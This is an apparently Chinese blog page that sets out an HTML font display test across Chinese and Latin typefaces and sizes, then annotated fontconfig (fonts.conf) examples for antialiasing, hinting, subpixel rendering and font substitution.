<h1 id="字体显示测试"><a href="#字体显示测试" class="headerlink" title="字体显示测试"></a>字体显示测试</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;字体效果测试&quot;</span>&gt;</span>字体效果测试<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 宋体; font-size: 12pt&quot;</span>&gt;</span>宋体12pt：这里是中文，以及标点符号“，。！？：；”This is English. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 宋体; font-size: 6pt&quot;</span>&gt;</span>这里是6pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 宋体; font-size: 7pt&quot;</span>&gt;</span>这里是7pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 宋体; font-size: 8pt&quot;</span>&gt;</span>这里是8pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 宋体; font-size: 9pt&quot;</span>&gt;</span>这里是9pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 宋体; font-size: 10pt&quot;</span>&gt;</span>这里是10pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 宋体; font-size: 11pt&quot;</span>&gt;</span>这里是11pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 黑体; font-size: 12pt&quot;</span>&gt;</span>黑体12pt：这里是中文，以及标点符号“，。！？：；”This is English. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 黑体; font-size: 6pt&quot;</span>&gt;</span>这里是6pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 黑体; font-size: 7pt&quot;</span>&gt;</span>这里是7pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 黑体; font-size: 8pt&quot;</span>&gt;</span>这里是8pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 黑体; font-size: 9pt&quot;</span>&gt;</span>这里是9pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 黑体; font-size: 10pt&quot;</span>&gt;</span>这里是10pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 黑体; font-size: 11pt&quot;</span>&gt;</span>这里是11pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 微软雅黑; font-size: 12pt&quot;</span>&gt;</span>微软雅黑12pt：这里是中文，以及标点符号“，。！？：；”This is English.  <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 微软雅黑; font-size: 6pt&quot;</span>&gt;</span>这里是6pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 微软雅黑; font-size: 7pt&quot;</span>&gt;</span>这里是7pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 微软雅黑; font-size: 8pt&quot;</span>&gt;</span>这里是8pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 微软雅黑; font-size: 9pt&quot;</span>&gt;</span>这里是9pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 微软雅黑; font-size: 10pt&quot;</span>&gt;</span>这里是10pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 微软雅黑; font-size: 11pt&quot;</span>&gt;</span>这里是11pt。<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: serif; font-size: 12pt&quot;</span>&gt;</span>serif: This is English, 这是英文中夹杂的中文。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: serif; font-size: 6pt&quot;</span>&gt;</span>Here is 6pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: serif; font-size: 7pt&quot;</span>&gt;</span>Here is 7pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: serif; font-size: 8pt&quot;</span>&gt;</span>Here is 8pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: serif; font-size: 9pt&quot;</span>&gt;</span>Here is 9pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: serif; font-size: 10pt&quot;</span>&gt;</span>Here is 10pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: serif; font-size: 11pt&quot;</span>&gt;</span>Here is 11pt.<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Times New Roman; font-size: 12pt&quot;</span>&gt;</span>Times New Roman: This is English, 这是英文中夹杂的中文。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Times New Roman; font-size: 6pt&quot;</span>&gt;</span>Here is 6pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Times New Roman; font-size: 7pt&quot;</span>&gt;</span>Here is 7pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Times New Roman; font-size: 8pt&quot;</span>&gt;</span>Here is 8pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Times New Roman; font-size: 9pt&quot;</span>&gt;</span>Here is 9pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Times New Roman; font-size: 10pt&quot;</span>&gt;</span>Here is 10pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Times New Roman; font-size: 11pt&quot;</span>&gt;</span>Here is 11pt.<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Georgia; font-size: 12pt&quot;</span>&gt;</span>Georgia: This is English, 这是英文中夹杂的中文。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Georgia; font-size: 6pt&quot;</span>&gt;</span>Here is 6pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Georgia; font-size: 7pt&quot;</span>&gt;</span>Here is 7pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Georgia; font-size: 8pt&quot;</span>&gt;</span>Here is 8pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Georgia; font-size: 9pt&quot;</span>&gt;</span>Here is 9pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Georgia; font-size: 10pt&quot;</span>&gt;</span>Here is 10pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Georgia; font-size: 11pt&quot;</span>&gt;</span>Here is 11pt.<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: sans-serif; font-size: 12pt&quot;</span>&gt;</span>sans-serif:  This is English, 这是英文中夹杂的中文。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: sans-serif; font-size: 6pt&quot;</span>&gt;</span>Here is 6pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: sans-serif; font-size: 7pt&quot;</span>&gt;</span>Here is 7pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: sans-serif; font-size: 8pt&quot;</span>&gt;</span>Here is 8pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: sans-serif; font-size: 9pt&quot;</span>&gt;</span>Here is 9pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: sans-serif; font-size: 10pt&quot;</span>&gt;</span>Here is 10pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: sans-serif; font-size: 11pt&quot;</span>&gt;</span>Here is 11pt.<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: verdana; font-size: 12pt&quot;</span>&gt;</span>verdana: This is English, 这是英文中夹杂的中文。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: verdana; font-size: 6pt&quot;</span>&gt;</span>Here is 6pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: verdana; font-size: 7pt&quot;</span>&gt;</span>Here is 7pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: verdana; font-size: 8pt&quot;</span>&gt;</span>Here is 8pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: verdana; font-size: 9pt&quot;</span>&gt;</span>Here is 9pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: verdana; font-size: 10pt&quot;</span>&gt;</span>Here is 10pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: verdana; font-size: 11pt&quot;</span>&gt;</span>Here is 11pt.<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Arial; font-size: 12pt&quot;</span>&gt;</span>Arial: This is English, 这是英文中夹杂的中文。<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Arial; font-size: 6pt&quot;</span>&gt;</span>Here is 6pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Arial; font-size: 7pt&quot;</span>&gt;</span>Here is 7pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Arial; font-size: 8pt&quot;</span>&gt;</span>Here is 8pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Arial; font-size: 9pt&quot;</span>&gt;</span>Here is 9pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Arial; font-size: 10pt&quot;</span>&gt;</span>Here is 10pt. <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: Arial; font-size: 11pt&quot;</span>&gt;</span>Here is 11pt.<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">&quot;font-family: monospace; font-size: 12pt&quot;</span>&gt;</span>程序代码：<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	　　#include <span class="symbol">&amp;lt;</span>stdio.h<span class="symbol">&amp;gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	　　int main()&#123;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	　　　　return 0;//很显然这是为了测试等宽字体<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	　　&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p></p><h2 id="字体效果测试">字体效果测试</h2><p></p>
<p>
<font style="font-family: 宋体; font-size: 12pt">宋体12pt：这里是中文，以及标点符号“，。！？：；”This is English. </font>
<font style="font-family: 宋体; font-size: 6pt">这里是6pt。</font>
<font style="font-family: 宋体; font-size: 7pt">这里是7pt。</font>
<font style="font-family: 宋体; font-size: 8pt">这里是8pt。</font>
<font style="font-family: 宋体; font-size: 9pt">这里是9pt。</font>
<font style="font-family: 宋体; font-size: 10pt">这里是10pt。</font>
<font style="font-family: 宋体; font-size: 11pt">这里是11pt。</font><br>

<font style="font-family: 黑体; font-size: 12pt">黑体12pt：这里是中文，以及标点符号“，。！？：；”This is English. </font>
<font style="font-family: 黑体; font-size: 6pt">这里是6pt。</font>
<font style="font-family: 黑体; font-size: 7pt">这里是7pt。</font>
<font style="font-family: 黑体; font-size: 8pt">这里是8pt。</font>
<font style="font-family: 黑体; font-size: 9pt">这里是9pt。</font>
<font style="font-family: 黑体; font-size: 10pt">这里是10pt。</font>
<font style="font-family: 黑体; font-size: 11pt">这里是11pt。</font><br>

<font style="font-family: 微软雅黑; font-size: 12pt">微软雅黑12pt：这里是中文，以及标点符号“，。！？：；”This is English.  </font>
<font style="font-family: 微软雅黑; font-size: 6pt">这里是6pt。</font>
<font style="font-family: 微软雅黑; font-size: 7pt">这里是7pt。</font>
<font style="font-family: 微软雅黑; font-size: 8pt">这里是8pt。</font>
<font style="font-family: 微软雅黑; font-size: 9pt">这里是9pt。</font>
<font style="font-family: 微软雅黑; font-size: 10pt">这里是10pt。</font>
<font style="font-family: 微软雅黑; font-size: 11pt">这里是11pt。</font><br>

<font style="font-family: serif; font-size: 12pt">serif: This is English, 这是英文中夹杂的中文。</font>
<font style="font-family: serif; font-size: 6pt">Here is 6pt. </font>
<font style="font-family: serif; font-size: 7pt">Here is 7pt. </font>
<font style="font-family: serif; font-size: 8pt">Here is 8pt. </font>
<font style="font-family: serif; font-size: 9pt">Here is 9pt. </font>
<font style="font-family: serif; font-size: 10pt">Here is 10pt. </font>
<font style="font-family: serif; font-size: 11pt">Here is 11pt.</font><br>

<font style="font-family: Times New Roman; font-size: 12pt">Times New Roman: This is English, 这是英文中夹杂的中文。</font>
<font style="font-family: Times New Roman; font-size: 6pt">Here is 6pt. </font>
<font style="font-family: Times New Roman; font-size: 7pt">Here is 7pt. </font>
<font style="font-family: Times New Roman; font-size: 8pt">Here is 8pt. </font>
<font style="font-family: Times New Roman; font-size: 9pt">Here is 9pt. </font>
<font style="font-family: Times New Roman; font-size: 10pt">Here is 10pt. </font>
<font style="font-family: Times New Roman; font-size: 11pt">Here is 11pt.</font><br>

<font style="font-family: Georgia; font-size: 12pt">Georgia: This is English, 这是英文中夹杂的中文。</font>
<font style="font-family: Georgia; font-size: 6pt">Here is 6pt. </font>
<font style="font-family: Georgia; font-size: 7pt">Here is 7pt. </font>
<font style="font-family: Georgia; font-size: 8pt">Here is 8pt. </font>
<font style="font-family: Georgia; font-size: 9pt">Here is 9pt. </font>
<font style="font-family: Georgia; font-size: 10pt">Here is 10pt. </font>
<font style="font-family: Georgia; font-size: 11pt">Here is 11pt.</font><br>

<font style="font-family: sans-serif; font-size: 12pt">sans-serif:  This is English, 这是英文中夹杂的中文。</font>
<font style="font-family: sans-serif; font-size: 6pt">Here is 6pt. </font>
<font style="font-family: sans-serif; font-size: 7pt">Here is 7pt. </font>
<font style="font-family: sans-serif; font-size: 8pt">Here is 8pt. </font>
<font style="font-family: sans-serif; font-size: 9pt">Here is 9pt. </font>
<font style="font-family: sans-serif; font-size: 10pt">Here is 10pt. </font>
<font style="font-family: sans-serif; font-size: 11pt">Here is 11pt.</font><br>

<font style="font-family: verdana; font-size: 12pt">verdana: This is English, 这是英文中夹杂的中文。</font>
<font style="font-family: verdana; font-size: 6pt">Here is 6pt. </font>
<font style="font-family: verdana; font-size: 7pt">Here is 7pt. </font>
<font style="font-family: verdana; font-size: 8pt">Here is 8pt. </font>
<font style="font-family: verdana; font-size: 9pt">Here is 9pt. </font>
<font style="font-family: verdana; font-size: 10pt">Here is 10pt. </font>
<font style="font-family: verdana; font-size: 11pt">Here is 11pt.</font><br>

<font style="font-family: Arial; font-size: 12pt">Arial: This is English, 这是英文中夹杂的中文。</font>
<font style="font-family: Arial; font-size: 6pt">Here is 6pt. </font>
<font style="font-family: Arial; font-size: 7pt">Here is 7pt. </font>
<font style="font-family: Arial; font-size: 8pt">Here is 8pt. </font>
<font style="font-family: Arial; font-size: 9pt">Here is 9pt. </font>
<font style="font-family: Arial; font-size: 10pt">Here is 10pt. </font>
<font style="font-family: Arial; font-size: 11pt">Here is 11pt.</font><br>

<font style="font-family: monospace; font-size: 12pt">程序代码：<br>
    　　#include &lt;stdio.h&gt;<br>
    　　int main(){<br>
    　　　　return 0;//很显然这是为了测试等宽字体<br>
    　　}
</font>
</p>



<h1 id="fonts-conf-手册"><a href="#fonts-conf-手册" class="headerlink" title="fonts.conf 手册"></a><code>fonts.conf</code> 手册</h1><h2 id="配置例解"><a href="#配置例解" class="headerlink" title="配置例解"></a>配置例解</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;match target=<span class="string">&quot;font&quot;</span>&gt;</span><br><span class="line"><span class="comment"># 抗锯齿</span></span><br><span class="line">    &lt;edit name=<span class="string">&quot;antialias&quot;</span> mode=<span class="string">&quot;assign&quot;</span>&gt;</span><br><span class="line">      &lt;bool&gt;<span class="literal">true</span>&lt;/bool&gt;</span><br><span class="line">    &lt;/edit&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 微调</span></span><br><span class="line">    &lt;edit name=<span class="string">&quot;hinting&quot;</span> mode=<span class="string">&quot;assign&quot;</span>&gt;</span><br><span class="line">      &lt;bool&gt;<span class="literal">true</span>&lt;/bool&gt;</span><br><span class="line">    &lt;/edit&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动微调器</span></span><br><span class="line">    &lt;edit name=<span class="string">&quot;autohint&quot;</span> mode=<span class="string">&quot;assign&quot;</span>&gt;</span><br><span class="line">      &lt;bool&gt;<span class="literal">true</span>&lt;/bool&gt;</span><br><span class="line">    &lt;/edit&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 微调样式</span></span><br><span class="line">    &lt;edit name=<span class="string">&quot;hintstyle&quot;</span> mode=<span class="string">&quot;assign&quot;</span>&gt;</span><br><span class="line">      &lt;const&gt;hintfull&lt;/const&gt;</span><br><span class="line">    &lt;/edit&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 亚像素渲染</span></span><br><span class="line"></span><br><span class="line">    &lt;edit name=<span class="string">&quot;rgba&quot;</span> mode=<span class="string">&quot;assign&quot;</span>&gt;</span><br><span class="line">      &lt;const&gt;rgb&lt;/const&gt;</span><br><span class="line">    &lt;/edit&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># LCD过滤器</span></span><br><span class="line">    &lt;edit mode=<span class="string">&quot;assign&quot;</span> name=<span class="string">&quot;lcdfilter&quot;</span>&gt;</span><br><span class="line">      &lt;const&gt;lcddefault&lt;/const&gt;</span><br><span class="line">    &lt;/edit&gt;</span><br><span class="line">&lt;/match&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消粗体字的自动微调功能</span></span><br><span class="line"></span><br><span class="line">&lt;match target=<span class="string">&quot;font&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">test</span> name=<span class="string">&quot;weight&quot;</span> compare=<span class="string">&quot;more&quot;</span>&gt;</span><br><span class="line">        &lt;const&gt;medium&lt;/const&gt;</span><br><span class="line">    &lt;/<span class="built_in">test</span>&gt;</span><br><span class="line">    &lt;edit name=<span class="string">&quot;autohint&quot;</span> mode=<span class="string">&quot;assign&quot;</span>&gt;</span><br><span class="line">        &lt;bool&gt;<span class="literal">false</span>&lt;/bool&gt;</span><br><span class="line">    &lt;/edit&gt;</span><br><span class="line">&lt;/match&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 只对较大的字体打开反锯齿功能</span></span><br><span class="line"></span><br><span class="line">&lt;match target=<span class="string">&quot;font&quot;</span>&gt;</span><br><span class="line">    &lt;edit name=<span class="string">&quot;antialias&quot;</span> mode=<span class="string">&quot;assign&quot;</span>&gt;</span><br><span class="line">        &lt;bool&gt;<span class="literal">false</span>&lt;/bool&gt;</span><br><span class="line">    &lt;/edit&gt;</span><br><span class="line">&lt;/match&gt;</span><br><span class="line"></span><br><span class="line">&lt;match target=<span class="string">&quot;font&quot;</span> &gt;</span><br><span class="line">    &lt;<span class="built_in">test</span> name=<span class="string">&quot;size&quot;</span> qual=<span class="string">&quot;any&quot;</span> compare=<span class="string">&quot;more&quot;</span>&gt;</span><br><span class="line">        &lt;double&gt;12&lt;/double&gt;</span><br><span class="line">    &lt;/<span class="built_in">test</span>&gt;</span><br><span class="line">    &lt;edit name=<span class="string">&quot;antialias&quot;</span> mode=<span class="string">&quot;assign&quot;</span>&gt;</span><br><span class="line">        &lt;bool&gt;<span class="literal">true</span>&lt;/bool&gt;</span><br><span class="line">    &lt;/edit&gt;</span><br><span class="line">&lt;/match&gt;</span><br><span class="line"></span><br><span class="line">&lt;match target=<span class="string">&quot;font&quot;</span> &gt;</span><br><span class="line">    &lt;<span class="built_in">test</span> name=<span class="string">&quot;pixelsize&quot;</span> qual=<span class="string">&quot;any&quot;</span> compare=<span class="string">&quot;more&quot;</span>&gt;</span><br><span class="line">        &lt;double&gt;16&lt;/double&gt;</span><br><span class="line">    &lt;/<span class="built_in">test</span>&gt;</span><br><span class="line">    &lt;edit name=<span class="string">&quot;antialias&quot;</span> mode=<span class="string">&quot;assign&quot;</span>&gt;</span><br><span class="line">        &lt;bool&gt;<span class="literal">true</span>&lt;/bool&gt;</span><br><span class="line">    &lt;/edit&gt;</span><br><span class="line">&lt;/match&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#字体替换</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换字体但并不改变字体的属性，Georgia被Ubuntu字体替换</span></span><br><span class="line"></span><br><span class="line">&lt;match target=<span class="string">&quot;pattern&quot;</span>&gt;</span><br><span class="line">   &lt;<span class="built_in">test</span> qual=<span class="string">&quot;any&quot;</span> name=<span class="string">&quot;family&quot;</span>&gt;&lt;string&gt;georgia&lt;/string&gt;&lt;/<span class="built_in">test</span>&gt;</span><br><span class="line">   &lt;edit name=<span class="string">&quot;family&quot;</span> mode=<span class="string">&quot;assign&quot;</span> binding=<span class="string">&quot;same&quot;</span>&gt;&lt;string&gt;Ubuntu&lt;/string&gt;&lt;/edit&gt;</span><br><span class="line"> &lt;/matc&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="comment"># 设置“优先”字体,缺失的情况下用设定的字体替换--&gt;</span></span><br><span class="line"></span><br><span class="line">&lt; !-- 用Bitstream Vera Sans Mono替换Helvetica --&gt;</span><br><span class="line">&lt; !-- 注意，默认配置文件中应该已经存在Helvetica的别名 --&gt;</span><br><span class="line">&lt;<span class="built_in">alias</span>&gt;</span><br><span class="line">    &lt;family&gt;Helvetica&lt;/family&gt;</span><br><span class="line">    &lt;prefer&gt;&lt;family&gt;Bitstream Vera Sans Mono&lt;/family&gt;&lt;/prefer&gt;</span><br><span class="line">    &lt;default&gt;&lt;family&gt;fixed&lt;/family&gt;&lt;/default&gt;</span><br><span class="line">&lt;/<span class="built_in">alias</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="built_in">alias</span>&gt;</span><br><span class="line">   &lt;family&gt;serif&lt;/family&gt;</span><br><span class="line">   &lt;prefer&gt;</span><br><span class="line">     &lt;family&gt;你喜欢的拉丁衬线字体名称&lt;/family&gt;</span><br><span class="line">     &lt;family&gt;你的中文衬线字体名称&lt;/family&gt;</span><br><span class="line">   &lt;/prefer&gt;</span><br><span class="line"> &lt;/<span class="built_in">alias</span>&gt;</span><br><span class="line"></span><br><span class="line">最常见的别名有：</span><br><span class="line">serif 代表衬线体（例如 DejaVu Serif、宋体）</span><br><span class="line">sans-serif 代表无衬线体（例如 DejaVu Sans 和各种黑体）</span><br><span 